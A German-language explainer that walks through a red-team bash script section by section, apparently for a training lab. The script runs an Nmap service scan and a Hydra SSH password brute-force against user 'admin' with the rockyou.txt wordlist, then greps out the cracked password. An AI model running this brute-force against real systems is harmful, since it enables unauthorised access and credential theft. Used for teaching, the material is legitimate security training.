
# 🛡️ Red-Team Angriffsskript – Erklärung

Dieses Bash-Skript führt automatisiert einen **Penetrationstest** durch: Ein **Nmap-Portscan** sowie ein **Brute-Force-Angriff** auf einen SSH-Dienst mittels Hydra. Nach erfolgreicher Ausführung wird ein Analyse-Skript aufgerufen.

---

## 📜 Allgemeine Struktur

```bash
#!/bin/bash
set -euo pipefail
```

- `#!/bin/bash`: Führt das Skript mit der Bash-Shell aus.
- `set -euo pipefail`: Sicheres Bash-Scripting
  - `-e`: Abbruch bei Fehlern
  - `-u`: Abbruch bei Verwendung undefinierter Variablen
  - `-o pipefail`: Fehler in Pipes führen zum Abbruch

---

## 📁 Verwendete Variablen

```bash
LOG_DIR="/logs"
MAIN_LOG="$LOG_DIR/attack.log"
NMAP_LOG="$LOG_DIR/nmap.txt"
HYDRA_LOG="$LOG_DIR/hydra.txt"
TARGET_HOST="ssh-target"
WORDLIST="/usr/share/wordlists/rockyou.txt"
```

- Speichert Log-Dateien zentral in `/logs`
- Zielsystem ist `"ssh-target"`
- Nutzt die verbreitete Wordlist `rockyou.txt` für Passwortangriffe

---

## 📝 Log-Funktion

```bash
log() {
    local msg="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $msg" | tee -a "$MAIN_LOG"
}
```

- Gibt Nachrichten mit Zeitstempel aus
- Schreibt gleichzeitig ins Terminal **und** in die Logdatei

---

## ✅ Initial Checks

```bash
mkdir -p "$LOG_DIR"
chmod 777 "$LOG_DIR"
```

- Erstellt das Log-Verzeichnis und gibt volle Rechte (nicht ideal für Produktionssysteme)

### Tool-Check

```bash
for tool in nmap hydra; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        log "Tool nicht gefunden: $tool"
        exit 1
    fi
done
```

- Prüft, ob die Tools `nmap` und `hydra` vorhanden sind

### Wordlist-Check

```bash
if [ ! -f "$WORDLIST" ]; then
    log "Wordlist nicht gefunden: $WORDLIST"
    exit 1
fi
```

---

## 🔍 Nmap-Portscan

```bash
nmap -sV -p 22,80,443 "$TARGET_HOST" -oN "$NMAP_LOG" >> "$MAIN_LOG" 2>&1
```

- Scannt SSH (22), HTTP (80) und HTTPS (443)
- Erkennt Dienstversionen (`-sV`)
- Speichert Ergebnisse in `nmap.txt` und zusätzlich im Hauptlog

---

## 🔓 Hydra SSH-Brute-Force

```bash
hydra -l admin -P "$WORDLIST" -t 8 -vV -f -e nsr ssh://$TARGET_HOST:22 -o "$HYDRA_LOG" >> "$MAIN_LOG" 2>&1
```

- Führt einen Brute-Force-Angriff durch:
  - Nutzer: `admin`
  - Passwortliste: rockyou.txt
  - `-t 8`: 8 Threads parallel
  - `-f`: Stoppt beim ersten Treffer
  - `-e nsr`: Testet leere, gleiche oder umgekehrte Passwörter

### Passwort extrahieren

```bash
FOUND_PASS=$(grep -o "password: [a-zA-Z0-9]*" "$HYDRA_LOG" | tail -1 | cut -d' ' -f2)
```

- Sucht nach erfolgreich gefundenem Passwort in der Ausgabe

---

## 🧪 Analyse und Abschluss

```bash
log "[+] Angriff abgeschlossen: $(date '+%Y-%m-%d %H:%M:%S')"
```

- Loggt Ende der Aktion

```bash
/analyze.sh
```

- Führt ein externes Analyse-Skript aus (nicht im Code enthalten)

---

## 📊 Zusammenfassung

| Abschnitt        | Zweck                                          |
|------------------|------------------------------------------------|
| Vorbereitung     | Log-Verzeichnis, Tool- & Wordlist-Check        |
| Nmap-Scan        | Erkennt offene Ports und Dienste               |
| Hydra-Angriff    | Bruteforce-Versuch auf SSH                     |
| Passwortanalyse  | Sucht nach erfolgreichem Passwort              |
| Abschluss        | Meldet Fertigstellung, startet Analyse         |

---

> ⚠️ **Hinweis:** Dieses Skript ist **nur für Schulungs-/Testumgebungen** gedacht. Der Einsatz in echten Netzwerken ohne Erlaubnis ist illegal!
